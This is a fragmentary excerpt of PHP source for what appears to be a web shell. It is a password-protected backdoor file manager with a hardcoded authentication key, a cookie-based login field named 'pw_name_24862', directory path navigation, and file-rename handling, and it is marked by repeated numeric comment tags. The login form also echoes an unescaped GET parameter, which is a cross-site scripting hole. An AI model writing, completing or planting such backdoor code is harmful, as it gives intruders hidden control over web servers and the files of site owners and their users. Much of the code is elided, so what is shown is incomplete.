...
$auth_key = "11da151f87d45b850a85c80cce9c20d8";
...
$pass = false;
if (isset($_COOKIE['pw_name_24862'])) {
    if(($_COOKIE['pw_name_24862']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_24862'])) {
        if(($_POST['pw_name_24862']) == $auth_key) {
            setcookie("pw_name_24862", $_POST['pw_name_24862']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_24862' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774623502 1724682774807422 1724682774798825 1724682774734094
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774623502 1724682774807422 1724682774798825 1724682774734094
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774623502 1724682774807422 1724682774798825 1724682774734094
            $name = PATH . "/" . $_GET['r'];
